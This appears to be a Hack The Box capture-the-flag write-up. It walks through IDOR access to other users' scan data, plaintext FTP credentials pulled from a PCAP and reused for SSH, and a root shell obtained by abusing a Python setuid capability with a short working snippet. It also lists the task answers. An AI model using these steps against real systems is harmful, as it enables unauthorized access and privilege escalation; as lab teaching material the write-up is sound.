# HTB Machine Write-Up

## Overview
This write-up documents the full compromise of the target machine through:

- Reconnaissance
- Enumeration
- PCAP analysis
- Initial access
- Privilege escalation

---

# Reconnaissance

We start with an Nmap scan to discover open ports:

```bash
nmap <ip>
```

### Task 1 — How many TCP ports are open?
**Answer:** `3`

---

# Enumeration

### Task 2 — Security Snapshot redirect path
After running a Security Snapshot, the browser redirects to:

```
/[something]/[id]
```

**Answer:** `data`

---

### Task 3 — Can we access other users’ scans?

By modifying the ID value:

```
/data/1
/data/2
/data/0
```

We can view other users’ results.

**Answer:** `yes`

---

### Task 4 — PCAP containing sensitive data

All `.pcap` files were downloaded and inspected manually using Wireshark:

https://www.wireshark.org/

**Answer:** `0`

---

### Task 5 — Protocol containing sensitive data

Inside the PCAP, credentials were visible in plaintext.

**Answer:** `FTP`

---

### Task 6 — Password reuse

Nathan’s FTP password also works on:

**Answer:** `ssh`

---

# Gaining Access

Login using SSH:

```bash
ssh nathan@<ip>
```

### Task 7 — User flag

```bash
cat user.txt
```

---

# Privilege Escalation

Local enumeration performed using LinEnum:

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

Upload and run:

```bash
nano LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Enumeration reveals a binary with special capabilities.

---

### Task 8 — Vulnerable binary path

```
/usr/bin/python3.8
```

---

# Exploitation

Spawn a root shell using Python capabilities:

```bash
python3
```

```python
import os
os.setuid(0)
os.system('/bin/sh')
```

---

### Task 9 — Root flag

```bash
cat /root/root.txt
```

---

# Summary

| Phase | Result |
|---------|-------------|
Recon | 3 open ports discovered |
Enum | `/data/[id]` exposure |
PCAP | FTP credentials recovered |
Access | SSH login as nathan |
PrivEsc | Python capability abuse |
Root | Shell obtained |

---

# Tools Used

- Nmap
- Wireshark
- SSH
- LinEnum
- Python
